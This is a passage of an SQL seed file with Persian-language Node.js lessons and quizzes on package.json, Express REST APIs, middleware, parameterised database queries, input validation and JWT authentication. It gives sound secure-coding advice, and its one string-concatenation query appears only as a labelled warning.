نشسته است."}]'::jsonb, '[{"q":"چرا setTimeout با تاخیر ۰، بعد از Promise اجرا می‌شود؟","opts":["باگ","چون Promise میکروتسک است و صف آن قبل از ماکروتسکِ setTimeout خالی می‌شود","تصادفی","بستگی به CPU"],"ans":1,"why":"Event Loop بعد از هر تسک، اول کل صف میکروتسک‌ها را خالی می‌کند؛ Promise در میکروتسک و setTimeout در ماکروتسک است."},{"q":"چرا سرور Node با یک نخ، هزاران کاربر همزمان را پاسخ می‌دهد؟","opts":["چون سریع است","چون I/O به سیستم‌عامل برون‌سپاری می‌شود و نخ فقط هنگام اجرای کد جاوااسکریپت مشغول است؛ اتصال‌ها فقط callback در صف‌اند","چند process مخفی دارد","ممکن نیست"],"ans":1,"why":"نخ در ۹۹٪ زمانِ درخواست شبکه، بیکار است؛ Node این زمان را به بقیه callbackها می‌دهد. مقیاس از «تعداد نخ» به «تعداد عمل در صف» منتقل می‌شود."},{"q":"چه کدی Event Loop را کاملاً قفل می‌کند؟","opts":["setTimeout طولانی","هر کد همگامِ طولانی مثل حلقه میلیون‌تایی یا parse فایل بزرگ — چون نخ تا پایان تابع آزاد نمی‌شود","Promise","fs.promises"],"ans":1,"why":"تابع همگام تا آخر اجرا می‌شود؛ هیچ callback دیگری در این بین نوبت نمی‌گیرد. درمان: شکستن کار به تکه‌ها یا worker thread برای CPU-bound."}]'::jsonb),
('node-b2', 'node', 'ماژول‌ها و package.json', 63, 11, '[{"k":"p","t":"Node با CommonJS (require) و ES Modules (import) ماژول‌ها را سازمان می‌دهد؛ package.json شناسنامه پروژه و node_modules خانه وابستگی‌هاست."},{"k":"h","t":"CommonJS در برابر ESM؛ جنگی که تمام شده"},{"k":"p","t":"دو سیستم ماژول در Node جنگیدند و ESM برنده شد: require/exports همگام است و در اجرا resolve می‌شود (CommonJS — قدیمی، هنوز در خیلی کدها هست)؛ import/export ایستا است و بیلدر/Node قبل از اجرا وابستگی‌ها را می‌بیند (ESM — استاندارد رسمی جاوااسکریپت). عملی‌اش: اگر type: \"module\" در package.json بگذاری، .jsها ESM‌اند و می‌توانی import بنویسی و از Top-Level Await استفاده کنی؛ وگرنه CommonJS پیش‌فرض است. برای پروژه جدید، بدون تردید ESM انتخاب کن — همه اکوسیستم به آن کوچ کرده. و اگر کتابخانه‌ای فقط CJS بود، import از ESM معمولاً کار می‌کند (Node پل می‌زند) ولی برعکسش دردسر دارد."},{"k":"h","t":"package.json فراتر از نام و نسخه"},{"k":"p","t":"چهار بخش که حرفه‌ای‌ها را جدا می‌کند: scripts — فرمان‌های قابل‌اجرا (npm run dev، npm test) که PATH محلی node_modules را هم اضافه می‌کنند، پس nodemon نصب‌شده را بدون مسیر کامل صدا می‌زنند. dependencies در برابر devDependencies — دومی فقط ابزار توسعه است (تستر، لینتر) و سرور تولید با --omit=dev نصبش نمی‌کند تا سبک و امن بماند. engines — اعلام نسخه Node موردنیاز که از «روی ماشین من کار می‌کرد» جلوگیری می‌کند. و مهم‌تر از همه، lockfile: فایل package-lock.json نسخه دقیق و درخت کامل وابستگی‌ها را میخ می‌کند تا npm install روی هر ماشین، دقیقاً همان درخت را بسازد — Commit نکردن lockfile یعنی هر استقرار یک نسخه متفاوت."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"json","title":"package.json یک API واقعی","code":"{\n  \"name\": \"shop-api\",\n  \"type\": \"module\",\n  \"engines\": { \"node\": \">=20\" },\n  \"scripts\": {\n    \"dev\": \"node --watch src/index.js\",\n    \"test\": \"node --test\",\n    \"start\": \"node src/index.js\"\n  },\n  \"dependencies\": {\n    \"express\": \"^4.19.0\"\n  },\n  \"devDependencies\": {\n    \"nodemon\": \"^3.1.0\"\n  }\n}"},{"k":"tip","title":"نکته منتور","t":"npm ci را در CI/CD و Dockerfile بشناس: برعکس npm install، lockfile را وحی مُنزل می‌گیرد و اگر با package.json ناسازگار باشد، خطا می‌دهد — یعنی استقرار دقیقاً همان چیزی است که تست کردی، نه «تقریباً»."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["type: module در package.json یعنی ESM","dependencies برای تولید و devDependencies برای توسعه","npm install بدون آرگومان همه را از lockfile نصب می‌کند"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"js","title":"package.json","code":"{\n  \"name\": \"app\",\n  \"type\": \"module\",\n  \"scripts\": { \"start\": \"node index.js\" },\n  \"dependencies\": { \"express\": \"^4.18.0\" },\n  \"devDependencies\": { \"nodemon\": \"^3.0.0\" }\n}"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: type: module در package.json یعنی ESM بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"تفاوت dependencies و devDependencies چیست؟","opts":["هیچ","dependencies برای اجرای تولید لازم است؛ devDependencies فقط برای توسعه و تست","نسخه‌شان","سرعت نصب"],"ans":1,"why":"در سرور تولید، npm install --omit=dev فقط dependencies را نصب می‌کند تا سبک بماند."},{"q":"چرا package-lock.json باید Commit شود؟","opts":["حجمش کم است","چون نسخه دقیق و درخت کامل وابستگی‌ها را میخ می‌کند؛ بدون آن npm install روی هر ماشین می‌تواند نسخه‌های متفاوتی بیاورد","اجباری نیست","فقط برای npm است"],"ans":1,"why":"ranges مثل ^4.19.0 یعنی «هر 4.x جدیدتر» — که فردا چیز دیگری است. lockfile «همین نسخه‌ها، همین ساختار» را تضمین می‌کند؛ بازتولیدپذیری از همین‌جا می‌آید."},{"q":"در سرور تولید چرا npm install --omit=dev مهم است؟","opts":["کندتر است","چون ابزار توسعه (تستر، لینتر و وابستگی‌هایشان) حذف می‌شوند — Image کوچک‌تر و سطح حمله کمتر","فرقی ندارد","برای سرعت اجرا"],"ans":1,"why":"هر بسته اضافی هم حجم Image را زیاد می‌کند هم CVE احتمالی می‌آورد؛ در تولید فقط runtime لازم است."}]'::jsonb),
('node-b3', 'node', 'ساخت REST API با Express', 63, 12, '[{"k":"p","t":"Express حداقل‌گراترین فریم‌ورک Node برای ساخت API است؛ با routeها و middleware یک سرور کامل می‌سازی و قرارداد REST مسیر و فعل HTTP را معنادار می‌کند."},{"k":"h","t":"REST یعنی قرارداد، نه تکنولوژی"},{"k":"p","t":"REST یک معماری است با چند قرارداد محکم: منبع (resource) با URL نام‌گذاری می‌شود (نه فعل)، فعل HTTP عمل را می‌گوید و کد وضعیت نتیجه را. یعنی GET /orders/42 «این سفارش را بیاور» است و POST /orders «سفارش بساز» — هیچ‌کس لازم نیست نام متدها را بداند. سه ویژگی که REST خوب را می‌سازد: اسامی جمع برای مجموعه‌ها (نه /getOrder)، statelessness (هر درخواست کامل است؛ سرور session نگه نمی‌دارد و این مقیاس‌پذیری می‌آورد) و کدهای وضعیت درست: ۲۰۰ موفق، ۲۰۱ ساخته‌شد (با Location)، ۲۰۴ موفقِ بی‌بدنه، ۴۰۰ ورودی بد، ۴۰۴ نیست، ۴۲۲ معنا دارد ولی نامعتبر، ۵۰۰ تقصیر ماست. کد وضعیت، زبان مشترک کلاینت و سرور است — ۲۰۰ با body خطا، خیانت در این قرارداد است."},{"k":"h","t":"ساختار یک handler حرفه‌ای؛ جداسازی چهار مرحله"},{"k":"p","t":"هر endpoint استاندارد سه لایه دارد: اعتبارسنجی ورودی (قبل از هر کاری — zod و مشابه‌ها)، فراخوانی منطق (که خودش نباید req/res را بشناسد؛ فقط داده بگیر و نتیجه برگردان) و ساخت پاسخ (کد وضعیت + بدنه). این جداسازی دو برد بزرگ دارد: منطق قابل‌تست می‌شود بدون بالاآوردن سرور (چون از Express بی‌خبر است) و خطاها یک‌جا به پاسخ تبدیل می‌شوند. و یک قاعده طلایی: route handlerها async می‌شوند و خطایشان باید به middleware خطا برسد — در Express 4 یک wrapper کوچک لازم است چون throw در async خودکار next نمی‌شود؛ در Express 5 این مشکل حل شده است."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"js","title":"CRUD کامل برای یک منبع","code":"app.get(''/orders'', async (req, res) => {\n  const orders = await listOrders(req.query.status);\n  res.json(orders);                          // 200\n});\n\napp.get(''/orders/:id'', async (req, res) => {\n  const order = await findOrder(req.params.id);\n  if (!order) return res.status(404).json({ error: ''سفارش پیدا نشد'' });\n  res.json(order);\n});\n\napp.post(''/orders'', async (req, res) => {\n  const parsed = OrderSchema.safeParse(req.body);\n  if (!parsed.success) return res.status(422).json({ error: parsed.error.issues });\n  const order = await createOrder(parsed.data);\n  res.status(201).location(`/orders/${order.id}`).json(order);\n});\n\napp.delete(''/orders/:id'', async (req, res) => {\n  await deleteOrder(req.params.id);\n  res.status(204).end();                     // موفق، بدون بدنه\n});"},{"k":"h","t":"جدول مرجع"},{"k":"table","head":["کد","معنی","کی"],"rows":[["200","OK","خواندن و به‌روزرسانی موفق"],["201","Created","بعد از POST موفق — با Location"],["204","No Content","DELETE موفق؛ بدنه‌ای نیست"],["400","Bad Request","ورودی از نظر ساختار خراب"],["404","Not Found","منبع وجود ندارد"],["422","Unprocessable","ساختار درست، معنا غلط"],["500","Server Error","باگ ما — جزئیات داخلی لو نرود"]]},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["GET خواندن، POST ساختن، PUT/PATCH به‌روزرسانی، DELETE حذف","app.use برای middleware سراسری و app.get برای مسیر","کد وضعیت پیام می‌دهد: ۲۰۰ موفق، ۲۰۱ ساخته‌شد، ۴۰۴ نیست، ۵۰۰ خطا"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"js","title":"api.js","code":"import express from ''express'';\nconst app = express();\napp.use(express.json());\n\napp.get(''/users'', (req, res) => res.json(users));\napp.post(''/users'', (req, res) => {\n  const u = { id: users.length + 1, ...req.body };\n  users.push(u);\n  res.status(201).json(u);\n});\napp.listen(3000);"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: GET خواندن، POST ساختن، PUT/PATCH به‌روزرسانی، DELETE حذف بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"بعد از POST موفق چه کد وضعیتی مناسب است؟","opts":["۲۰۰","۲۰۱ ساخته‌شد","۴۰۴","۳۰۲"],"ans":1,"why":"201 Created به معنی منبع جدید ساخته‌شده است و معمولاً با Location و بدنه منبع جدید برمی‌گردد."},{"q":"چرا GET /deleteOrder?id=4 ضدREST است؟","opts":["کوتاه‌تر نیست","چون عمل را در URL برده؛ در REST فعل HTTP عمل را می‌گوید و URL فقط منبع است — DELETE /orders/4","سریع‌تر است","فرقی ندارد"],"ans":1,"why":"REST می‌خواهد URL «اسم» باشد و HTTP «فعل». اسامی قابل‌ترکیب و قابل‌حدس‌اند؛ افعال در URL یعنی هر تیم یک زبان اختراع کند و کش‌پذیری GET هم خراب می‌شود."},{"q":"بعد از ساخت منبع با POST، بهترین پاسخ چیست؟","opts":["200 بدون چیزی","201 Created همراه هدر Location که URL منبع جدید را می‌دهد","404","302"],"ans":1,"why":"۲۰۱ دقیقاً می‌گوید «منبعی ساخته شد» و Location به کلاینت می‌گوید «اینجاست» — بدون این، کلاینت برای پیدا کردن ساخته‌اش حدس می‌زند."}]'::jsonb),
('node-b4', 'node', 'Middleware و ترتیب اجرا', 63, 13, '[{"k":"p","t":"هر درخواست در Express از زنجیره middleware می‌گذرد؛ هر کدام می‌تواند درخواست را تغییر دهد، پاسخ بدهد یا با next() به بعدی بسپارد — ترتیب ثبت، ترتیب اجراست."},{"k":"h","t":"زنجیره مسئولیت؛ چرا ترتیب همه‌چیز است"},{"k":"p","t":"هر درخواست Express از آرایه‌ای از middlewareها به ترتیب ثبت می‌گذرد و هرکدام سه قدرت دارد: تغییر درخواست/پاسخ (req.user = ... برای auth)، پایان دادن (res.json) یا سپردن به بعدی (next()). حالا ترتیب، معنا می‌سازد: body parser باید قبل از routeها باشد وگرنه req.body خالی است؛ auth باید قبل از routeهای حفاظت‌شده باشد؛ logger اول باشد تا همه را ببیند؛ و error handler همیشه آخر — چون فقط خطاهایی را می‌گیرد که از routeها بالا آمده‌اند. یک قانون حفظی: «هر middleware فقط چیزی را می‌بیند که قبلی‌ها ساخته‌اند» — و ۹۰٪ باگ‌های middleware از جابه‌جا ثبت‌کردن است، نه از کد اشتباه."},{"k":"h","t":"error handler؛ چهار پارامتری که Express را نجات می‌دهد"},{"k":"p","t":"middleware خطا با امضایش شناخته می‌شود: دقیقاً چهار پارامتر (err, req, res, next) — Express با Reflection تعداد پارامترها را می‌شمارد و تابع چهارتایی را فقط وقتی صدا می‌زند که کسی next(err) کرده باشد. این یعنی یک مدیریت خطای مرکزی: همه routeها خطا را با next(err) (یا throw در Express 5) به انتها می‌فرستند و یک‌جا لاگ می‌شود، جزئیات داخلی پاک‌سازی می‌شود (err.stack به log، یک پیام امن به کاربر) و کد وضعیت مناسب برگردانده می‌شود. بدون این، هر route یک try/catch با سلیقه خودش دارد — و خطایی که وسط یکی جا بماند، connection را برای همیشه آویزان می‌کند."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"js","title":"یک pipeline کامل به ترتیب درست","code":"const app = express();\n\napp.use(morgan(''tiny''));              // ۱) لاگ همه‌چیز\napp.use(express.json());              // ۲) parse بدنه — قبل از routeها\napp.use(authenticate);                // ۳) هویت — req.user می‌سازد\n\napp.use(''/api'', apiRouter);           // ۴) routeها\n\n// ۵) ۴۰۴ — هرچه تا اینجا نرسیده، مسیرش اشتباه بوده\napp.use((req, res) => res.status(404).json({ error: ''مسیر نیست'' }));\n\n// ۶) error handler — همیشه آخر، همیشه ۴ پارامتر\napp.use((err, req, res, next) => {\n  console.error(err.stack);                        // جزئیات → لاگ\n  res.status(err.status ?? 500)\n     .json({ error: err.status ? err.message : ''خطای داخلی'' });\n});"},{"k":"warn","title":"دام رایج","t":"فراموش‌کردن next() در middleware شرطی: if (!req.user) res.status(401).json(...) — بدون return یا next، اجرا ادامه می‌یابد و بعداً دو پاسخ ارسال می‌شود (خطای headers already sent). همیشه بعد از res در middleware، return کن."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["next() را فراموش کنی، درخواست همان‌جا می‌ماند","middleware خطا ۴ پارامتر دارد: (err, req, res, next)","app.use ترتیب را تعیین می‌کند؛ auth قبل از routeها"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"js","title":"mw.js","code":"app.use((req, res, next) => {\n  console.log(req.method, req.url);\n  next();\n});\n\napp.use((err, req, res, next) => {\n  res.status(500).json({ error: ''خطای داخلی'' });\n});"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: next() را فراموش کنی، درخواست همان‌جا می‌ماند بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"اگر middleware‌ای next() را صدا نزند چه می‌شود؟","opts":["خطای ۵۰۰","درخواست همان‌جا می‌ماند تا client timeout شود؛ پاسخی نمی‌رود","به بعدی می‌رود","کرش می‌کند"],"ans":1,"why":"زنجیره فقط با next() جلو می‌رود؛ بدون آن نه پاسخی ارسال می‌شود نه middleware بعدی اجرا می‌شود."},{"q":"چرا error handler باید ۴ پارامتر داشته باشد؟","opts":["قرارداد سلیقه‌ای","چون Express از روی تعداد پارامترها می‌فهمد این error handler است؛ وگرنه مثل middleware عادی همیشه صدایش می‌زند","برای سازگاری","پارامتر چهارم استفاده نمی‌شود"],"ans":1,"why":"تشخیص با Reflection است: تابع چهارپارامتره فقط در مسیر خطا (next(err)) وارد چرخه می‌شود؛ سه‌پارامتره‌ها برای هر درخواست اجرا می‌شوند."},{"q":"express.json() قبل از routeها ثبت نشود چه می‌شود؟","opts":["سرور بالا نمی‌آید","req.body در handlerها undefined است چون هنوز کسی بدنه را parse نکرده","کندتر می‌شود","خطای ۵۰۰"],"ans":1,"why":"middlewareها به ترتیب اجرا می‌شوند؛ اگر parser بعد از route باشد، handler قبل از parse اجرا شده — req.body خالی است. ترتیب، معناست."}]'::jsonb)
INSERT INTO lessons (id, course_id, title, minutes, sort_order, blocks, quiz) VALUES
('node-b5', 'node', 'کار با دیتابیس و SQL', 56, 14, '[{"k":"p","t":"اتصال Node به دیتابیس با درایور یا ORM انجام می‌شود؛ همیشه از query پارامتری‌شده استفاده کن تا از SQL injection در امان باشی."},{"k":"h","t":"اتصال Node به دیتابیس؛ درایور و pool"},{"k":"p","t":"برای کار با دیتابیس از Node، یا مستقیم از درایور (مثل pg برای PostgreSQL) استفاده می‌کنی یا از یک ORM/query builder (مثل Prisma یا Knex) که لایه بالاتری می‌دهد. در هر حال، هیچ‌وقت برای هر query یک اتصال جدید نساز؛ ساخت اتصال گران است. به‌جای آن از connection pool استفاده کن: مجموعه‌ای از اتصال‌های آماده که queryها از آن قرض می‌گیرند و برمی‌گردانند. تنظیم اندازه pool مهم است؛ خیلی کوچک یعنی صف انتظار، خیلی بزرگ یعنی فشار به دیتابیس."},{"k":"h","t":"Query پارامتری‌شده؛ خط قرمز امنیت"},{"k":"p","t":"مهم‌ترین قانون کار با SQL: هرگز ورودی کاربر را با اتصال رشته داخل query نگذار، چون راه را برای SQL injection باز می‌کند — جایی که مهاجم با ورودی دست‌کاری‌شده، ساختار query را عوض می‌کند. راه درست، query پارامتری‌شده است: ساختار query ثابت است و مقادیر جدا و با جای‌نگهدار ($1 یا ?) پاس داده می‌شوند؛ آن‌وقت درایور خودش آن‌ها را امن می‌کند و ورودی کاربر هرگز به‌عنوان فرمان تفسیر نمی‌شود. این یک عادت همیشگی است، نه یک بهینه‌سازی."},{"k":"h","t":"جدول مرجع"},{"k":"table","head":["","اتصال رشته (خطرناک)","پارامتری‌شده"],"rows":[["ورودی کاربر","داخل متن query","جدا، با جای‌نگهدار"],["SQL injection","ممکن","جلوگیری می‌شود"],["مثال","''SELECT ... '' + id","''SELECT ... $1'', [id]"]]},{"k":"warn","title":"دام رایج","t":"هرگز query را با چسباندن رشته و ورودی کاربر نساز؛ حتی اگر فکر می‌کنی ورودی «فقط عدد است» یا «از جای امن می‌آید». یک query پارامتری‌شده همیشه امن است و بهانه‌ای برای رهاکردنش نیست — این رایج‌ترین و خطرناک‌ترین باگ وب است."},{"k":"tip","title":"نکته منتور","t":"ORMها (مثل Prisma) به‌طور پیش‌فرض query را پارامتری می‌کنند و امنیت را راحت می‌کنند؛ ولی اگر از raw query استفاده کردی، همان قانون پارامتری‌سازی را دستی رعایت کن. ضمن اینکه pool را فراموش نکن — اتصال مستقیم برای هر درخواست، زیر بار کم می‌آورد."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["pool اتصال‌ها را نگه می‌دارد تا هر query اتصال نسازد","query پارامتری‌شده: db.query(''SELECT ... WHERE id=$1'', [id])","ORM مثل Prisma نوع و مهاجرت را مدیریت می‌کند"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"js","title":"db.js","code":"import pg from ''pg'';\nconst pool = new pg.Pool({ connectionString: process.env.DB_URL });\n\napp.get(''/users/:id'', async (req, res) => {\n  const { rows } = await pool.query(\n    ''SELECT * FROM users WHERE id = $1'', [req.params.id]);\n  res.json(rows[0]);\n});"},{"k":"warn","title":"هشدار","t":"ساخت query با اتصال رشته (SELECT * FROM users WHERE id = '' + id) یعنی دعوت از SQL injection؛ همیشه پارامتری‌شده."},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: pool اتصال‌ها را نگه می‌دارد تا هر query اتصال نسازد بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"چرا query پارامتری‌شده امن است؟","opts":["کوتاه‌تر است","چون مقادیر جدا از ساختار فرمان به دیتابیس می‌روند و به‌عنوان داده تفسیر می‌شوند","سریع‌تر است","کش می‌شود"],"ans":1,"why":"در query پارامتری، ورودی کاربر هرگز بخشی از ساختار SQL نمی‌شود؛ پس نمی‌تواند فرمان تزریق کند."},{"q":"چرا query پارامتری‌شده جلوی SQL injection را می‌گیرد؟","opts":["کوتاه‌تر است","چون ساختار query ثابت می‌ماند و ورودی کاربر جدا و فقط به‌عنوان داده تفسیر می‌شود، نه فرمان","سریع‌تر است","کش می‌شود"],"ans":1,"why":"در اتصال رشته، ورودی کاربر بخشی از متن فرمان می‌شود و می‌تواند ساختارش را عوض کند؛ ولی در پارامتری، درایور مقدار را جدا نگه می‌دارد و هرگز به‌عنوان SQL اجرا نمی‌شود."},{"q":"چرا از connection pool استفاده می‌کنیم؟","opts":["برای امنیت","چون ساخت اتصال گران است؛ pool اتصال‌های آماده را نگه می‌دارد تا queryها قرض بگیرند و برگردانند","برای فشرده‌سازی","اجباری است"],"ans":1,"why":"باز و بسته‌کردن اتصال برای هر query سربار زیادی دارد و دیتابیس را خسته می‌کند؛ pool با اتصال‌های ازپیش‌ساخته و قابل‌استفاده‌مجدد، این هزینه را حذف و تعداد اتصال را هم کنترل می‌کند."}]'::jsonb),
('node-b6', 'node', 'اعتبارسنجی ورودی', 56, 15, '[{"k":"p","t":"هرگز به ورودی client اعتماد نکن؛ اعتبارسنجی باید در سرور انجام شود حتی اگر فرانت هم چک کند، چون فرانت قابل‌دورزدن است."},{"k":"h","t":"هرگز به ورودی کلاینت اعتماد نکن"},{"k":"p","t":"هر چیزی که از کلاینت می‌آید — بدنه درخواست، پارامترها، هدرها — می‌تواند دست‌کاری شده باشد، حتی اگر فرانت خودت آن را فرستاده باشد؛ چون مهاجم می‌تواند فرانت را دور بزند و مستقیم به API درخواست خام بفرستد. پس اعتبارسنجی فرانت فقط برای تجربه کاربری است و اعتبارسنجی واقعی باید همیشه در سرور انجام شود: نوع هر فیلد، بازه‌اش، طولش و قالبش را چک کن و اگر نامعتبر بود، با کد ۴۰۰ و پیام روشن رد کن."},{"k":"h","t":"اعتبارسنجی ساختاریافته با schema"},{"k":"p","t":"به‌جای نوشتن ifهای دستی برای هر فیلد، از کتابخانه‌های schema-based مثل zod استفاده کن: یک‌بار schema تعریف می‌کنی (مثلاً نام حداقل ۲ کاراکتر، سن عدد بین ۰ تا ۱۲۰، ایمیل معتبر) و کتابخانه هم اعتبارسنجی می‌کند هم در TypeScript نوع می‌دهد. فایده‌اش این است که قواعد در یک‌جا و خوانا تعریف می‌شوند، خطاها ساختاریافته برمی‌گردند، و اگر schema و نوع از هم جدا نشوند، یک تغییر هر دو را به‌روز می‌کند."},{"k":"h","t":"جدول مرجع"},{"k":"table","head":["چیزی که باید چک شود","مثال"],"rows":[["نوع","سن عدد است، نه رشته"],["بازه","سن بین ۰ تا ۱۲۰"],["طول","نام بین ۲ تا ۵۰ کاراکتر"],["قالب","ایمیل قالب درست دارد"],["وجود فیلد","فیلدهای ضروری هست؛ فیلد اضافه نادیده گرفته شود"]]},{"k":"warn","title":"دام رایج","t":"به اعتبارسنجی فرانت به‌عنوان دفاع امنیتی تکیه نکن؛ چون به‌راحتی دور زده می‌شود. فرانت برای راحتی کاربر چک می‌کند (تا زودتر خطا را ببیند) ولی سرور باید مستقل و کامل خودش چک کند، چون تنها لایه‌ای است که مهاجم نمی‌تواند ردش کند."},{"k":"tip","title":"نکته منتور","t":"در پیام‌های خطای اعتبارسنجی، دقیق بگو کدام فیلد و چرا رد شده (برای فرانت) ولی جزئیات داخلی سیستم را فاش نکن؛ و فیلدهای ناشناخته ورودی را به‌جای خطادادن، معمولاً نادیده بگیر تا API در برابر افزودن فیلد در آینده شکننده نشود."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["کتابخانه‌هایی مثل zod هم نوع می‌دهند هم اعتبارسنجی","در سرور همیشه نوع، بازه و طول را چک کن","پیام خطای مشخص ولی بدون افشای جزئیات داخلی"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"js","title":"validate.js","code":"import { z } from ''zod'';\nconst UserSchema = z.object({\n  name: z.string().min(2).max(50),\n  age: z.number().int().min(0).max(120),\n  email: z.string().email(),\n});\n\napp.post(''/users'', (req, res) => {\n  const parsed = UserSchema.safeParse(req.body);\n  if (!parsed.success)\n    return res.status(400).json({ error: parsed.error.issues });\n  /* ادامه با parsed.data */\n});"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: کتابخانه‌هایی مثل zod هم نوع می‌دهند هم اعتبارسنجی بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"چرا اعتبارسنجی فقط در فرانت کافی نیست؟","opts":["کافی است","چون client قابل‌کنترل است و هرکس می‌تواند درخواست خام بفرستد","فرانت کند است","CSS خراب می‌شود"],"ans":1,"why":"فرانت فقط برای تجربه کاربری چک می‌کند؛ مهاجم مستقیم به API درخواست می‌فرستد، پس سرور باید خودش اعتبارسنجی کند."},{"q":"چرا اعتبارسنجی فقط در فرانت کافی نیست؟","opts":["فرانت کند است","چون کلاینت قابل‌کنترل است و مهاجم می‌تواند فرانت را دور بزند و درخواست خام بفرستد؛ پس سرور باید خودش چک کند","CSS خراب می‌شود","اجباری نیست"],"ans":1,"why":"فرانت فقط برای تجربه کاربری است؛ هیچ تضمینی نیست درخواست واقعاً از فرانت تو آمده باشد. سرور تنها نقطه‌ای است که همه درخواست‌ها مجبورند از آن بگذرند، پس اعتبارسنجی واقعی آن‌جاست."},{"q":"مزیت اعتبارسنجی schema-based (مثل zod) نسبت به if دستی چیست؟","opts":["سریع‌تر اجرا می‌شود","قواعد در یک‌جا و خوانا تعریف می‌شوند، خطاها ساختاریافته‌اند و نوع هم از همان schema به دست می‌آید","کمتر حافظه","امن‌تر است"],"ans":1,"why":"با if دستی، قواعد پخش و تکراری می‌شوند و نوع از اعتبارسنجی جدا می‌ماند؛ با schema، یک تعریف هم اعتبارسنجی می‌کند هم نوع می‌دهد و تغییرش همه‌جا اثر می‌گذارد."}]'::jsonb),
('node-b7', 'node', 'احراز هویت با JWT', 56, 16, '[{"k":"p","t":"JWT توکنی امضاشده است که ادعاها را حمل می‌کند؛ سرور فقط امضا را چک می‌کند. دسترسی کوتاه‌عمر و refresh در کوکی HttpOnly الگوی امن است."},{"k":"h","t":"JWT؛ توکن امضاشده برای احراز هویت"},{"k":"p","t":"در APIهای بدون session، سرور باید راهی داشته باشد که بفهمد هر درخواست از طرف چه کاربری است. JWT یک توکن امضاشده است که «ادعاها» (مثل user id و نقش) را حمل می‌کند: سرور هنگام ورود آن را با یک کلید مخفی امضا و به کلاینت می‌دهد و بعد در هر درخواست فقط امضایش را راستی‌آزمایی می‌کند — بدون نیاز به نگهداری session در سرور. ساختارش سه بخش است (header.payload.signature) که با نقطه جدا می‌شوند و payload قابل‌خواندن است، پس اطلاعات حساس نباید داخلش باشد چون رمزنگاری نمی‌شود، فقط امضا می‌شود."},{"k":"h","t":"الگوی امن؛ access کوتاه و refresh در کوکی"},{"k":"p","t":"دو خطر اصلی JWT این است که اگر دزدیده شود تا انقضا قابل‌استفاده است و اگر در localStorage باشد با هر XSS لو می‌رود. الگوی رایج برای کاهش ریسک: یک access token کوتاه‌عمر (مثلاً ۱۵ دقیقه) که در حافظه یا متغیر نگه داشته می‌شود و در هدر Authorization می‌رود، به‌همراه یک refresh token بلندعمر که در کوکی HttpOnly (که جاوااسکریپت نمی‌تواند بخواندش) ذخیره و فقط برای گرفتن access جدید استفاده می‌شود. این‌طوری حتی اگر access لو برود، پنجره سوءاستفاده کوتاه است و refresh هم از XSS در امان است."},{"k":"h","t":"جدول مرجع"},{"k":"table","head":["","Session","JWT"],"rows":[["نگهداری وضعیت","در سرور","خود توکن (امضاشده)"],["ابطال","آسان (حذف session)","تا انقضا سخت؛ نیاز به لیست سیاه"],["مقیاس‌پذیری","نیاز به session مشترک","stateless؛ مناسب چند سرور"]]},{"k":"warn","title":"دام رایج","t":"هیچ‌وقت اطلاعات حساس (رمز، شماره کارت) را داخل payload JWT نگذار؛ چون payload فقط base64 است و هرکس توکن را ببیند می‌تواند بخواندش — امضا فقط جلوی تغییر را می‌گیرد، نه خواندن را. JWT برای گفتن «این کاربر کیست» است، نه برای حمل رازها."},{"k":"tip","title":"نکته منتور","t":"انقضای access token را کوتاه نگه دار؛ هرچه کوتاه‌تر، پنجره سوءاستفاده در صورت لو رفتن کمتر است. سختیِ کوتاه‌بودن را با refresh token جبران کن تا کاربر مدام مجبور به ورود مجدد نشود."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["jwt.sign ادعاها را با secret امضا می‌کند","توکن را در هدر Authorization: Bearer بفرست","secret را در متغیر محیطی نگه دار، نه کد"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"js","title":"jwt.js","code":"import jwt from ''jsonwebtoken'';\n\nconst token = jwt.sign(\n  { sub: user.id, role: user.role },\n  process.env.SECRET,\n  { expiresIn: ''15m'' });\n\n// middleware:\nconst payload = jwt.verify(req.headers.authorization?.split('' '')[1], process.env.SECRET);"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: jwt.sign ادعاها را با secret امضا می‌کند بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"چرا JWT را نباید در localStorage نگه داشت؟","opts":["کند است","چون هر اسکریپت صفحه (از جمله XSS) می‌تواند آن را بخواند؛ کوکی HttpOnly امن‌تر است","جا نمی‌شود","مرورگر 